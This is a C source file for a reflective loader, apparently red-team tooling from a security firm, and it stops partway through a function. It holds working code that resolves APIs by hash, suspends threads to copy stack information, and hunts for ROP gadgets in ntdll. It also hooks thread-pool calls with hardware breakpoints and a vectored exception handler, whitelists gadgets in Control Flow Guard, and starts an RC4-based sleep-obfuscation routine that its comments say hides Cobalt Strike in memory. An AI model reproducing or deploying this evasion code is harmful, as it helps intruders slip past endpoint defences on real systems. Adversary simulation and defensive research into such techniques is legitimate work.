/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

NTSTATUS
NTAPI
RtlRegisterWaitQueue(
	_In_ PHANDLE NewTimerQueue
);

NTSTATUS
NTAPI
RtlCopyMappedMemory(
	_In_ LPVOID Destination,
	_In_ LPVOID Source,
	_In_ SIZE_T Length
);

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, *PUSTRING ;

typedef struct
{
	PVOID	Rsp;
	PVOID	Ev1;
	PVOID	Ev2;
} THREAD_PARAM, *PTHREAD_PARAM ;

typedef struct
{
	PVOID	Thread;
	PVOID	Master;
	PVOID	Slaves;

	D_API( SwitchToFiber );
} FIBER_PARAM, *PFIBER_PARAM ;

typedef struct
{
	PVOID	TebInformation;
	ULONG	TebOffset;
	ULONG	BytesToRead;
} THREAD_TEB_INFORMATION ;

NTSTATUS
NTAPI
SystemFunction032(
	_In_ PUSTRING Buffer,
	_In_ PUSTRING Key
);

typedef struct
{
	D_API( SetProcessValidCallTargets );
} CFG_API ;

typedef struct
{
	D_API( RtlRemoveVectoredExceptionHandler );
	D_API( RtlAddVectoredExceptionHandler );
	D_API( RtlRegisterWait );
} HCK_API ;

typedef struct
{
	D_API( NtQueryInformationThread );
	D_API( LdrGetProcedureAddress );
	D_API( NtWaitForSingleObject );
	D_API( ConvertThreadToFiber );
	D_API( ConvertFiberToThread );
	D_API( RtlInitUnicodeString );
	D_API( NtSetContextThread );
	D_API( NtGetContextThread );
	D_API( RtlInitAnsiString );
	D_API( NtCreateThreadEx );
	D_API( NtSuspendThread );
	D_API( RtlAllocateHeap );
	D_API( NtResumeThread );
	D_API( NtCreateEvent );
	D_API( SwitchToFiber );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( CreateFiber );
	D_API( DeleteFiber );
	D_API( NtSetEvent );
	D_API( LdrLoadDll );
	D_API( NtClose );
} MIN_API ;

typedef struct
{
	D_API( CloseThreadpoolCleanupGroupMembers );
	D_API( NtSignalAndWaitForSingleObject );
	D_API( CreateThreadpoolCleanupGroup );
	D_API( SetThreadpoolThreadMaximum );
	D_API( SetThreadpoolThreadMinimum );
	D_API( NtQueryInformationThread );
	D_API( LdrGetProcedureAddress );
	D_API( WaitForSingleObjectEx );
	D_API( NtWaitForSingleObject );
	D_API( NtQueryVirtualMemory );
	D_API( RtlInitUnicodeString );
	D_API( RtlCopyMappedMemory );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( RtlDeregisterWait );
	D_API( SystemFunction032 );
	D_API( RtlCaptureContext );
	D_API( RtlInitAnsiString );
	D_API( NtDuplicateObject );
	D_API( NtCreateThreadEx );
	D_API( CreateThreadpool );
	D_API( NtSuspendThread );
	D_API( NtGetNextThread );
	D_API( CloseThreadpool );
	D_API( RtlAllocateHeap );
	D_API( VirtualProtect );
	D_API( NtResumeThread );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( SetEvent );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER	0xad1b018e /* RtlRemoveVectoredExceptionHandler */
#define H_API_RTLADDVECTOREDEXCEPTIONHANDLER	0x2df06c89 /* RtlAddVectoredExceptionHandler */
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_NTQUERYINFORMATIONTHREAD		0xf5a0461b /* NtQueryInformationThread */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLCOPYMAPPEDMEMORY		0x5b56b302 /* RtlCopyMappedMemory */
#define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_RTLDEREGISTERWAIT			0x961776da /* RtlDeregisterWait */
#define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
#define H_API_NTDUPLICATEOBJECT			0x4441d859 /* NtDuplicateObject */
#define H_API_NTCREATETHREADEX			0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_RTLREGISTERWAIT			0x600fe691 /* RtlRegisterWait */
#define H_API_NTSUSPENDTHREAD			0xe43d93e1 /* NtSuspendThread */
#define H_API_NTGETNEXTTHREAD			0xa410fb9e /* NtGetNextThread */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_NTRESUMETHREAD			0x5a4bc3d0 /* NtResumeThread */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTSETEVENT			0xcb87d8b5 /* NtSetEvent */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_SETEVENT				0x9d7ff713 /* SetEvent */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/* STR Hashes */
#define H_STR_TPALLOCWAIT			0x3fc54f89 /* TpAllocWait */
#define H_STR_TEXT				0x0b6ea858 /* .text */

/*!
 *
 * Purpose:
 *
 * Extracts information about the current thread 
 * and notifies when ready. Does not return, as 
 * the new thread will be manipulated to back to
 * the new entry.
 *
!*/
static D_SEC( E ) VOID WINAPI ThreadCaptureReturnAddr( _In_ PTHREAD_PARAM Param )
{
	/* Extract the frame address */
	Param->Rsp = C_PTR( U_PTR( __builtin_frame_address( 0 ) ) + sizeof( PVOID ) );

	/* Notify we can be modified and wait till we can run the modification */
	( ( __typeof__( NtSignalAndWaitForSingleObject ) * ) PeGetFuncEat( 
		PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT ) )(
		Param->Ev1, Param->Ev2, FALSE, NULL
	);

};

/*!
 *
 * Purpose:
 *
 * Get a handle to the thread pool thread so we can
 * copy its NT_TIB structure from the leaked RSP
 * stack pointer.
 *
!*/
static D_SEC( E ) BOOLEAN GetThreadInfoBlockFromStack( _In_ PVOID Address, _Out_ PNT_TIB InfoBlock )
{
	API				Api;
	NT_TIB				Tib;
	CONTEXT				Ctx;
	CLIENT_ID			Cid;
	THREAD_TEB_INFORMATION		Tti;
	MEMORY_BASIC_INFORMATION	Mb1;
	MEMORY_BASIC_INFORMATION	Mb2;

	BOOLEAN				Ret = FALSE;

	HANDLE				Thd = NULL;
	HANDLE				Nxt = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tib, sizeof( Tib ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
	Api.NtQueryVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtGetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtDuplicateObject        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.NtSuspendThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSUSPENDTHREAD );
	Api.NtGetNextThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Enumerate the entire threads that are available */
	while ( NT_SUCCESS( Api.NtGetNextThread( NtCurrentProcess(), Thd, THREAD_ALL_ACCESS, 0, 0, &Nxt ) ) ) {
		/* Do we have a valid thread? */
		if ( Thd != NULL ) {
			/* Close it! */
			Api.NtClose( Thd );
		};
		/* Move to next thread */
		Thd = C_PTR( Nxt );

		/* Setup parameters we want to query */
		Tti.TebOffset      = FIELD_OFFSET( TEB, ClientId );
		Tti.BytesToRead    = sizeof( CLIENT_ID );
		Tti.TebInformation = C_PTR( &Cid );

		/* Query Information about the target thread */
		if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadTebInformation, &Tti, sizeof( Tti ), NULL ) ) ) {
			/* Does not match our current thread? */
			if ( U_PTR( Cid.UniqueThread ) != U_PTR( NtCurrentTeb()->ClientId.UniqueThread ) ) {
				/* Suspend the current thread */
				if ( NT_SUCCESS( Api.NtSuspendThread( Thd, NULL ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					/* Get information about the current thread */
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {
						/* Query information about the RSP */
						if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Ctx.Rsp, MemoryBasicInformation, &Mb1, sizeof( Mb1 ), NULL ) ) ) {
							/* Query information about the stack leak */
							if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Address, MemoryBasicInformation, &Mb2, sizeof( Mb2 ), NULL ) ) ) {
								/* Query information about the same region */
								if ( U_PTR( Mb1.AllocationBase ) == U_PTR( Mb2.AllocationBase ) ) {

									/* Setup parameters of what we want to query */
									Tti.TebOffset      = FIELD_OFFSET( TEB, NtTib );
									Tti.BytesToRead    = sizeof( NT_TIB );
									Tti.TebInformation = C_PTR( InfoBlock );

									/* Query information about the target thread */
									if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadTebInformation, &Tti, sizeof( Tti ), NULL ) ) ) {
										/* Status */
										Ret = TRUE ;
									};
								};
							};
						};
					};
					/* Resume the current thread */
					Api.NtResumeThread( Thd, NULL );
				};
			};
		};
		/* Did we read it successfully? */
		if ( Ret != FALSE ) {
			/* Abort! */
			break;
		};
	};
	/* Close the last reference */
	if ( Thd != NULL ) {
		/* Close the handle! */
		Api.NtClose( Thd );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tib, sizeof( Tib ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Locates a jmp rax 0xFF, 0xE0 gadget in memory.
 * Used as a means of hiding the CONTEXT structure
 * from Patriot.
 *
!*/
static D_SEC( E ) PVOID GetJmpRaxTarget( VOID )
{
	HDE			Hde;

	ULONG			Ofs = 0;

	PBYTE			Ptr = NULL;
	PBYTE			Pos = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

	Dos = C_PTR( PebGetModule( H_LIB_NTDLL ) );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Enumerate each individual section in memory */
	for ( INT Idx = 0; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
		/* Locate the .text section in memory */
		if ( HashString( & Sec[ Idx ].Name, 0 ) == H_STR_TEXT ) {

			Ofs = 0;
			Pos = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );

			do 
			{
				/* Attempt to disassemble */
				HDE_DISASM( C_PTR( U_PTR( Pos ) + Ofs ), &Hde );

				/* Did this fail to disassemble? */
				if ( Hde.flags & F_ERROR ) {
					/* Couldnt decode? Odd: Move up one byte! */
					Ofs = Ofs + 1; 

					/* Restart the loop */
					continue;
				};

				/* Is the instruction the right size? */
				if ( Hde.len == 2 ) {
					/* Does the instruction match the correct operand etc? */
					if ( ( ( PBYTE ) ( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 0 ] == 0xFF && ( ( PBYTE )( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 1 ] == 0xE0 ) {
						/* Set the address of the instruction */
						Ptr = C_PTR( U_PTR( Pos ) + Ofs );

						/* Abort! */
						break;
					};
				};

				/* Increment to next instruction */
				Ofs = Ofs + Hde.len;
			} while ( Ofs < Sec[ Idx ].SizeOfRawData );

			/* Abort! */
			break;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

	/* Return Address */
	return C_PTR( Ptr );
};

/*!
 *
 * Purpose:
 *
 * Enables a debug breakpoint at the specified addr.
 * Uses DR3 to trigger the breakpoint without issue.
 *
!*/
static D_SEC( E ) NTSTATUS EnableBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	NTSTATUS	Nst = 0;
	ULONG_PTR	Bit = 0;
	ULONG_PTR	Msk = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if ( NT_SUCCESS( ( Nst = Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) ) {
		/* Set DR3 to the specified address */
		Ctx.Dr3 = U_PTR( Addr );

		/* Set DR7 */
		Ctx.Dr7 &= ~( 3ULL << ( 16 + 4 * 3 ) );
		Ctx.Dr7 &= ~( 3ULL << ( 18 + 4 * 3 ) );
		Ctx.Dr7 |= 1ULL << ( 2 * 3 );

		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		Nst = Api.NtSetContextThread( NtCurrentThread(), &Ctx );
	};
	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	/* Status */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * Disables DR3 debug register 
 *
!*/

static D_SEC( E ) NTSTATUS RemoveBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	NTSTATUS	Nst = 0;
	ULONG_PTR	Msk = 0;
	ULONG_PTR	Bit = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if ( NT_SUCCESS( ( Nst = Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) ) {
		/* Set DR7 */
		Ctx.Dr3  = 0;
		Ctx.Dr7 &= ~( 1ULL << ( 2 * 3 ) ); 

		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		Nst = Api.NtSetContextThread( NtCurrentThread(), &Ctx );
	};
	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	/* Status */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * Modifies TpAllocWait to use a custom thread pool. Inteded to
 * act as a hook for the call RtlRegisterWait and redirected to
 * with a VEH debugger.
 *
!*/
static D_SEC( E ) NTSTATUS NTAPI TpAllocWaitHook( _Out_ PTP_WAIT **Out, _In_ PTP_WAIT_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
{
	PTABLE		Tbl = NULL;
	NTSTATUS 	Ret = STATUS_UNSUCCESSFUL;

	/* Get a pointer to Table */
	Tbl = C_PTR( G_SYM( Table ) );

	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
	if ( NT_SUCCESS( RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) ) ) {
		/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
		Ret = ( ( __typeof__( TpAllocWaitHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) )(
			Out, Callback, Context, & Tbl->Table->Debugger.PoolEnv
	
		);
	};

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Simple VEH-based debugger that will attempt to redirect all
 * calls to TpAllocWork to a hooked version which will insert
 * our custom thread pool.
 *
!*/
static D_SEC( E ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
{
	DWORD	Ret = EXCEPTION_CONTINUE_SEARCH;
	PTABLE	Tbl = NULL;

	Tbl = C_PTR( G_SYM( Table ) );

	/* Is the thread where our debugger comes from ? */
	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) {
				/* Redirect TpAllocTimer -> TpAllocTimerHook */
				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocWaitHook ) );
			};
			/* Notify! */
			Ret = EXCEPTION_CONTINUE_EXECUTION;
		};
	};

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Inserts a breakpoint to force RtlRegisterWait
 * to use our thread pool, then calls the func
 * as normal.
 *
!*/
static D_SEC( E ) NTSTATUS NTAPI RtlRegisterWaitWrap(
	_In_ PHANDLE NewWaitObject,
	_In_ HANDLE Object,
	_In_ WAITORTIMERCALLBACKFUNC Callback,
	_In_ PVOID Context,
	_In_ ULONG Milliseconds,
	_In_ ULONG Flags
)
{
	HCK_API		Api;
	PVOID		Veh = NULL;
	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
	Api.RtlRegisterWait                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREGISTERWAIT );

	/* Insert a Vectored Exception Handling callback to act as a hooking debugger */
	if ( ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) != NULL ) {
		/* Insert a breakpoint into ntdll!TpAllocWait */
		if ( NT_SUCCESS( EnableBreakpoint( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) ) {
			/* Call the API, which will then 'hooked' */
			Nst = Api.RtlRegisterWait( NewWaitObject, Object, Callback, Context, Milliseconds, Flags );

			/* 'Remove' the breakpoint */
			RemoveBreakpoint( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) );
		};
		/* Remove the VEH handler */
		Api.RtlRemoveVectoredExceptionHandler( Veh );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Status */
	return Nst;
};

/*!
 *
 * Purpose:
 *
 * Adds a ROP gadget to the CFG exception list to
 * permit ROP gadgets from being marked as an
 * invalid target.
 *
!*/
static D_SEC( E ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	CFG_API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );
};

/*!
 *
 * Purpose:
 *
 * Uses NightHawk's Obfuscate/Sleep implementation to
 * hide traces of Cobalt Strike in memory. Temporary 
 * version, limited to x86_64 currently. Blocks on a
 * 'handle' to wait on.
 *
!*/
static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
{
	API			Api;
	UCHAR			Rnd[ 16 ];
	NT_TIB			Oli;
	NT_TIB			Nwi;
	USTRING			Key;
	USTRING			Buf;
	CONTEXT			Ctx;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	DWORD			Prt = 0;
	DWORD			Del = 0;
	SIZE_T			XLn = 0;
	SIZE_T			FLn = 0;

	PVOID			Ev1 = NULL;
	PVOID			Ev2 = NULL;
	PVOID			Ev3 = NULL;
	PVOID			Ev4 = NULL;
	PVOID			K32 = NULL;
	PVOID			Adv = NULL;
	PVOID			Img = NULL;
	PVOID			Que = NULL;

	PVOID			Cln = NULL;
	PVOID			Pol = NULL;

	PVOID			Gdg = NULL;

	HANDLE			Src = NULL;
	PTABLE			Tbl = NULL;
	PCONTEXT		Cap = NULL;
	PCONTEXT		Beg = NULL;
	PCONTEXT		Set = NULL;
	PCONTEXT		Enc = NULL;
	PCONTEXT		Gt1 = NULL;
	PCONTEXT		Cp1 = NULL;
	PCONTEXT		Cp2 = NULL;
	PCONTEXT		St1 = NULL;
	PCONTEXT		Sev = NULL;
	PCONTEXT		Blk = NULL;
	PCONTEXT		Cp3 = NULL;
	PCONTEXT		St2 = NULL;
	PCONTEXT		Dec = NULL;
	PCONTEXT		Res = NULL;
	PCONTEXT		End = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Oli, sizeof( Oli ) );
	RtlSecureZeroMemory( &Nwi, sizeof( Nwi ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
	Api.LdrGetProcedureAddress         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
	Api.RtlCopyMappedMemory            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
	Api.NtGetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.RtlDeregisterWait              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDEREGISTERWAIT );
	Api.RtlCaptureContext              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.RtlInitAnsiString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.NtDuplicateObject              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.NtGetNextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
	Api.RtlAllocateHeap                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.NtResumeThread                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtContinue                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Load kernel32.dll if it somehow isnt already! */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
	
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"advapi32.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpoolCleanupGroupMembers" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpoolCleanupGroupMembers );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpoolCleanupGroup" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpoolCleanupGroup );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMaximum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMaximum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMinimum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMinimum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObjectEx" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObjectEx );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SystemFunction032" ) ) );
			Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "VirtualProtect" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.VirtualProtect );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetEvent" ) ) );
